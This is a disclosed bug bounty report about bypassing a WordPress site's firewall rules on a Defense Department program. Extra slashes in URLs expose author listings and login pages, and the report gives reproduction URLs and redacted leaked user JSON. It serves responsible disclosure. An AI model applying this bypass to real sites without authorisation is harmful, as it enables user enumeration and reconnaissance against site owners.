# Firewall rules for ████████ can be bypassed to leak site authors

## Report Details
- **Report ID**: 743643
- **URL**: https://hackerone.com/reports/743643
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-21T21:00:46.178Z
- **Disclosed**: 2020-05-14T16:54:01.416Z

## Reporter
- **Username**: nrockhouse
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
████ is a WordPress application that has several endpoints locked behind firewall, such as login screen and author names, but it can be bypassed.

**Description:**
By using additional slashes in the URL, I can bypass the firewall rules to display some WordPress information. Interestingly, these bypass only work for GET requests, but not POST requests. I have listed some of the endpoints below.

## Impact
Display names of site authors.

## Step-by-step Reproduction Instructions

1. https://████████/wp-json/wp/v2/users (403 Forbidden) -> https://██████████/wp-json/wp/v2//users (200 OK)
2. https://██████/wp-login.php (403 Forbidden) -> https://██████/wp-login.php/ (200 OK) (Unfortunately POST requests are still blocked with this bypass, so testing passwords isn't possible)
3. https://█████/wp-login.php?action=lostpassword (403 Forbidden) -> https://███████/wp-login.php/?action=lostpassword (200 OK) (POST requests kinda worked with this endpoint, it showed "Access Denied" but the message came from WordPress and not the WAF/web server, which meant the request went through)

## Product, Version, and Configuration (If applicable)
WordPress

## Suggested Mitigation/Remediation Actions
Fix the firewall rules.

## Proof of Concept
Output from wp-json/wp/v2//users
``[{"id":4,"name":"████","url":"http:\/\/cloudlakellc.com","description":"","link":"https:\/\/██████████\/author\/█████████\/","slug":"██████████","avatar_urls":{"24":"https:\/\/secure.gravatar.com\/avatar\/█████████?s=24&d=mm&r=g","48":"https:\/\/secure.gravatar.com\/avatar\/█████?s=48&d=mm&r=g","96":"https:\/\/secure.gravatar.com\/avatar\/███?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"https:\/\/████████\/wp-json\/wp\/v2\/users\/4"}],"collection":[{"href":"https:\/\/█████████\/wp-json\/wp\/v2\/users"}]}},{"id":6,"name":"█████████","url":"","description":"","link":"https:\/\/█████\/author\/███\/","slug":"███","avatar_urls":{"24":"https:\/\/secure.gravatar.com\/avatar\/████?s=24&d=mm&r=g","48":"https:\/\/secure.gravatar.com\/avatar\/████████?s=48&d=mm&r=g","96":"https:\/\/secure.gravatar.com\/avatar\/████████?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"https:\/\/███████\/wp-json\/wp\/v2\/users\/6"}],"collection":[{"href":"https:\/\/████████\/wp-json\/wp\/v2\/users"}]}},{"id":2,"name":"████████","url":"","description":"","link":"https:\/\/█████\/author\/████████\/","slug":"███████","avatar_urls":{"24":"https:\/\/secure.gravatar.com\/avatar\/█████?s=24&d=mm&r=g","48":"https:\/\/secure.gravatar.com\/avatar\/█████████?s=48&d=mm&r=g","96":"https:\/\/secure.gravatar.com\/avatar\/███?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"https:\/\/████\/wp-json\/wp\/v2\/users\/2"}],"collection":[{"href":"https:\/\/██████████\/wp-json\/wp\/v2\/users"}]}}]``

## Impact

Obtain details about the site authors.

## Attachments
No attachments
